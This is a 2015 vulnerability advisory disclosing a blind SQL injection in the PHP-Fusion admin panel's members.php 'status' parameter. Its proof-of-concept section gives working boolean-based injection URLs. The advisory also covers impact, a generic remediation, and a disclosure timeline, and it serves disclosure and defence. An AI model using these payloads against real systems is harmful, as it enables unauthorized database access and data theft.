@@ -1,0 +1,86 @@
+=============================================
+MGC ALERT 2015-002
+- Original release date: September 18, 2015
+- Last revised:  October 05, 2015
+- Discovered by: Manuel García Cárdenas
+- Severity: 7,1/10 (CVSS Base Score)
+=============================================
+
+I. VULNERABILITY
+-------------------------
+Blind SQL Injection in admin panel PHP-Fusion <= v7.02.07
+
+II. BACKGROUND
+-------------------------
+PHP-Fusion is a lightweight open source content management system (CMS)
+written in PHP.
+
+III. DESCRIPTION
+-------------------------
+This bug was found using the portal with authentication as administrator.
+To exploit the vulnerability only is needed use the version 1.0 of the HTTP
+protocol to interact with the application. It is possible to inject SQL
+code in the variable "status" on the page "members.php".
+
+IV. PROOF OF CONCEPT
+-------------------------
+The following URL's and parameters have been confirmed to all suffer from
+Blind SQL injection.
+
+/phpfusion/files/administration/members.php?aid=99ad64700ec4ce10&sortby=all&status=0
+
+Exploiting with true request (with mysql5):
+
+/phpfusion/files/administration/members.php?aid=99ad64700ec4ce10&sortby=all&status=0'
+AND substr(@@version,1,1)='5
+
+Exploiting with false request:
+
+/phpfusion/files/administration/members.php?aid=99ad64700ec4ce10&sortby=all&status=0'
+AND substr(@@version,1,1)='4
+
+V. BUSINESS IMPACT
+-------------------------
+Public defacement, confidential data leakage, and database server
+compromise can result from these attacks. Client systems can also be
+targeted, and complete compromise of these client systems is also possible.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+PHP-Fusion <= v7.02.07
+
+VII. SOLUTION
+-------------------------
+All data received by the application and can be modified by the user,
+before making any kind of transaction with them must be validated.
+
+VIII. REFERENCES
+-------------------------
+https://www.php-fusion.co.uk/
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered and reported
+by Manuel García Cárdenas (advidsec (at) gmail (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+September 18, 2015 1: Initial release
+October 10, 2015 2: Revision to send to lists
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+September 18, 2015 1: Vulnerability acquired by Manuel Garcia Cardenas
+September 18, 2015 2: Send to vendor
+September 24, 2015 3: Second mail to the verdor without response
+October   10, 2015 4: Send to the Full-Disclosure lists
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+
+XIII. ABOUT
+-------------------------
+Manuel Garcia Cardenas
+Pentester
